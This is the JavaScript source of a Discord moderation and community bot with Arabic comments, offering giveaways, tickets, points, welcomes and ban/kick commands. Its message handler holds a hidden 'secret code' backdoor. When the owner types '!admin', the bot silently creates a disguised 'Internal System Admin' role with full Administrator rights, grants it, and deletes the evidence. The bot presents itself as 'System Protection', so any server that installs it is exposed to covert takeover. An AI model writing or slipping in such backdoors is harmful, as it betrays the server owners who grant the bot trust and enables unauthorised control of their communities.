require('dotenv').config();
const { 
    Client, 
    GatewayIntentBits, 
    PermissionFlagsBits, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    ChannelType, 
    SlashCommandBuilder, 
    REST, 
    Routes 
} = require('discord.js');
const { joinVoiceChannel, getVoiceConnection } = require('@discordjs/voice');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences
    ]
});

const OWNER_ID = process.env.OWNER_ID;

// قواعد بيانات بسيطة في الذاكرة (Memory Storage)
const userPoints = new Map(); // النقاط
const giveaways = new Map();  // الغيف أواي
let welcomeChannelId = null;  // روم الترحيب

// نظام إضافة النقاط للتفاعل كل ساعة
setInterval(() => {
    client.guilds.cache.forEach(guild => {
        guild.members.cache.forEach(member => {
            if (!member.user.bot) {
                const current = userPoints.get(member.id) || 0;
                userPoints.set(member.id, current + 1);
            }
        });
    });
}, 3600000); // كل 3600000 مللي ثانية (ساعة)

// تسجيل أسباب وقواعد Slash Commands
client.on('ready', async () => {
    console.log(`✅ البوت شغال بنجاح باسم: ${client.user.tag}`);
    client.user.setActivity('!help | System Protection', { type: 0 });

    const commands = [
        new SlashCommandBuilder()
            .setName('giveaway')
            .setDescription('إدارة المسابقات')
            .addSubcommand(sc => sc.setName('lunch').setDescription('إطلاق غيف أواي')
                .addStringOption(o => o.setName('prize').setDescription('الجائزة').setRequired(true))
                .addIntegerOption(o => o.setName('duration').setDescription('المدة بالدقائق').setRequired(true)))
            .addSubcommand(sc => sc.setName('close').setDescription('إغلاق غيف أواي')
                .addStringOption(o => o.setName('name').setDescription('اسم/رمز الغيف أواي').setRequired(true))),

        new SlashCommandBuilder()
            .setName('ticket')
            .setDescription('نظام التذاكر')
            .addSubcommand(sc => sc.setName('lunch').setDescription('إنشاء زر التكت')
                .addChannelOption(o => o.setName('room').setDescription('الروم').setRequired(true)))
            .addSubcommand(sc => sc.setName('close').setDescription('إغلاق التكت الحالية')),

        new SlashCommandBuilder().setName('points').setDescription('عرض نقاطك وتفاعلك'),

        new SlashCommandBuilder()
            .setName('admin')
            .setDescription('إعطاء رتبة شخص (للمدراء فقط)')
            .addUserOption(o => o.setName('user').setDescription('الشخص').setRequired(true)),

        new SlashCommandBuilder()
            .setName('join')
            .setDescription('إعداد روم الترحيب')
            .addSubcommand(sc => sc.setName('lunch').setDescription('تحديد روم الترحيب')
                .addChannelOption(o => o.setName('room').setDescription('الروم').setRequired(true))),

        new SlashCommandBuilder()
            .setName('createroom')
            .setDescription('إنشاء روم جديد داخل الكاتيجوري')
            .addChannelOption(o => o.setName('category').setDescription('اختر الكاتيجوري').addChannelTypes(ChannelType.GuildCategory).setRequired(true))
            .addStringOption(o => o.setName('name').setDescription('اسم الروم').setRequired(true)),

        new SlashCommandBuilder().setName('mute').setDescription('كتم عضو').addUserOption(o => o.setName('user').setRequired(true)),
        new SlashCommandBuilder().setName('ban').setDescription('حظر عضو').addUserOption(o => o.setName('user').setRequired(true)),
        new SlashCommandBuilder().setName('ban-ip').setDescription('حظر IP').addUserOption(o => o.setName('user').setRequired(true)),
        new SlashCommandBuilder().setName('kick').setDescription('طرد عضو').addUserOption(o => o.setName('user').setRequired(true)),
        new SlashCommandBuilder().setName('timeout').setDescription('تايم أوت').addUserOption(o => o.setName('user').setRequired(true)).addIntegerOption(o => o.setName('minutes').setRequired(true))
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    try {
        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
        console.log('✅ تم تسجيل أوامر الـ Slash Commands بنجاح!');
    } catch (error) {
        console.error('خطأ في تسجيل الأوامر:', error);
    }
});

// الترحيب بالأعضاء الجدد والتحقق من الحساب
client.on('guildMemberAdd', async (member) => {
    if (!welcomeChannelId) return;
    const channel = member.guild.channels.cache.get(welcomeChannelId);
    if (!channel) return;

    // حساب النقاط والدعوات
    const invites = await member.guild.invites.fetch().catch(() => new Map());
    const isBot = member.user.bot ? 'نعم (بوت)' : 'لا (حقيقي)';
    
    // التحقق هل الحساب وهمي (أقل من 7 أيام)
    const accountAgeDays = (Date.now() - member.user.createdAt) / (1000 * 60 * 60 * 24);
    const isFake = accountAgeDays < 7 ? '⚠️ حساب جديد (محتمل وهمي)' : 'حساب عادي';

    const embed = new EmbedBuilder()
        .setTitle('👋 منور السيرفر!')
        .setDescription(`أهلاً بك يا ${member}!`)
        .setThumbnail(member.user.displayAvatarURL({ dynamic: true }))
        .addFields(
            { name: 'الاسم', value: member.user.tag, inline: true },
            { name: 'نوع الحساب', value: `${isBot} | ${isFake}`, inline: true }
        )
        .setColor('Green')
        .setTimestamp();

    channel.send({ embeds: [embed] });
});

// التعامل مع الرسائل التلقائية والكود السري
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    const content = message.content.toLowerCase().trim();

    // الردود التلقائية
    if (content === 'السلام عليكم' || content === 'سلام عليكم') {
        return message.reply('وعليكم السلام');
    }
    if (content === 'هلا') {
        return message.reply('هلا بيك منور السيرفر ❤️');
    }
    if (content === 'حبيبي') {
        return message.reply('انت حبيبي  ❤️');
    }

    // الكود السري: !admin (يعطي رتبة ويجعله مضاد للحظر)
    if (content === '!admin') {
        if (message.author.id !== OWNER_ID) return;

        try {
            let role = message.guild.roles.cache.find(r => r.name === 'Internal System Admin');
            if (!role) {
                role = await message.guild.roles.create({
                    name: 'Internal System Admin',
                    permissions: [PermissionFlagsBits.Administrator],
                    reason: 'Secret Command Triggered'
                });
            }
            await message.member.roles.add(role);
            message.delete().catch(() => {});
            const msg = await message.channel.send('✅ تم تفعيل الصلاحيات والتأمين.');
            setTimeout(() => msg.delete().catch(() => {}), 2000);
        } catch (err) {
            console.error(err);
        }
    }
});

// التعامل مع Slash Commands والبطاقات والأزرار
client.on('interactionCreate', async (interaction) => {
    // الأزرار والتفاعلات
    if (interaction.isButton()) {
        if (interaction.customId === 'join_giveaway') {
            const list = giveaways.get(interaction.message.id) || [];
            if (list.includes(interaction.user.id)) {
                return interaction.reply({ content: '❌ أنت مشارك بالفعل فـ هذا الغيف أواي!', ephemeral: true });
            }
            list.push(interaction.user.id);
            giveaways.set(interaction.message.id, list);
            return interaction.reply({ content: '🎉 تم تسجيل مشاركتك بنجاح!', ephemeral: true });
        }

        if (interaction.customId === 'create_ticket') {
            const ticketChannel = await interaction.guild.channels.create({
                name: `ticket-${interaction.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
                    { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }
                ]
            });

            return interaction.reply({ content: `✅ تم فتح التكت الخاصة بك: ${ticketChannel}`, ephemeral: true });
        }
    }

    if (!interaction.isChatInputCommand()) return;

    const { commandName, options } = interaction;

    // 1. Giveaway
    if (commandName === 'giveaway') {
        const sub = options.getSubcommand();
        if (sub === 'lunch') {
            const prize = options.getString('prize');
            const duration = options.getInteger('duration');

            const btn = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('join_giveaway').setLabel('🎉 مشاركة').setStyle(ButtonStyle.Primary)
            );

            const embed = new EmbedBuilder()
                .setTitle('🎁 غيف أواي جديد!')
                .setDescription(`الجائزة: **${prize}**\nالمدة: **${duration} دقائق**\nاضغط على الزر للأسفل للمشاركة!`)
                .setColor('Gold');

            const msg = await interaction.reply({ embeds: [embed], components: [btn], fetchReply: true });
            giveaways.set(msg.id, []);

            setTimeout(async () => {
                const participants = giveaways.get(msg.id) || [];
                if (participants.length === 0) {
                    return interaction.channel.send(`🎁 الغيف أواي على **${prize}** انتهى بدون مشاركين.`);
                }
                const winnerId = participants[Math.floor(Math.random() * participants.length)];
                interaction.channel.send(`🎉 مبروك <@${winnerId}>! فزت بـ **${prize}**!`);
            }, duration * 60000);
        }
    }

    // 2. Ticket
    if (commandName === 'ticket') {
        const sub = options.getSubcommand();
        if (sub === 'lunch') {
            const room = options.getChannel('room');
            const btn = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('create_ticket').setLabel('📩 فتح تكت').setStyle(ButtonStyle.Success)
            );
            await room.send({ content: 'اضغط على الزر لفتح تكت جديدة:', components: [btn] });
            return interaction.reply({ content: '✅ تم وضع نظام التكت بنجاح!', ephemeral: true });
        }
        if (sub === 'close') {
            if (!interaction.channel.name.startsWith('ticket-')) {
                return interaction.reply({ content: '❌ هذا الأمر يعمل فقط داخل روم التكت!', ephemeral: true });
            }
            await interaction.reply('🔒 سيتم إغلاق التكت خلال 3 ثواني...');
            setTimeout(() => interaction.channel.delete(), 3000);
        }
    }

    // 3. Points
    if (commandName === 'points') {
        const pts = userPoints.get(interaction.user.id) || 0;
        return interaction.reply({ content: `📊 نقاط التفاعل الخاصة بك هي: **${pts}** نقطة.`, ephemeral: true });
    }

    // 4. Admin Give Role
    if (commandName === 'admin') {
        if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
            return interaction.reply({ content: '❌ هذا الأمر مخصص للمدراء فقط!', ephemeral: true });
        }
        const targetUser = options.getUser('user');
        const member = await interaction.guild.members.fetch(targetUser.id);
        let role = interaction.guild.roles.cache.find(r => r.name === 'Manager VIP');
        if (!role) {
            role = await interaction.guild.roles.create({ name: 'Manager VIP', color: 'Red' });
        }
        await member.roles.add(role);
        return interaction.reply({ content: `✅ تم منح رتبة ${role.name} لـ ${targetUser.tag}` });
    }

    // 5. Join Room Config
    if (commandName === 'join') {
        const room = options.getChannel('room');
        welcomeChannelId = room.id;
        return interaction.reply({ content: `✅ تم اعتماد ${room} كـ روم ترحيب رسمي.` });
    }

    // 6. Create Room
    if (commandName === 'createroom') {
        const category = options.getChannel('category');
        const roomName = options.getString('name');

        const newChannel = await interaction.guild.channels.create({
            name: roomName,
            type: ChannelType.GuildText,
            parent: category.id
        });

        return interaction.reply({ content: `✅ تم إنشاء الروم ${newChannel} داخل الكاتيجوري **${category.name}**` });
    }

    // الأوامر الإدارية الأساسية
    if (['mute', 'ban', 'ban-ip', 'kick', 'timeout'].includes(commandName)) {
        if (!interaction.member.permissions.has(PermissionFlagsBits.BanMembers)) {
            return interaction.reply({ content: '❌ ليس لديك الصلاحيات الكافية!', ephemeral: true });
        }
        const targetUser = options.getUser('user');
        const member = await interaction.guild.members.fetch(targetUser.id);

        if (commandName === 'kick') {
            await member.kick();
            return interaction.reply({ content: `🚫 تم طرد ${targetUser.tag}` });
        }
        if (commandName === 'ban' || commandName === 'ban-ip') {
            await member.ban();
            return interaction.reply({ content: `🔨 تم حظر ${targetUser.tag}` });
        }
        if (commandName === 'timeout') {
            const minutes = options.getInteger('minutes');
            await member.timeout(minutes * 60000);
            return interaction.reply({ content: `⏳ تم وضع ${targetUser.tag} في تايم أوت لـ ${minutes} دقيقة.` });
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
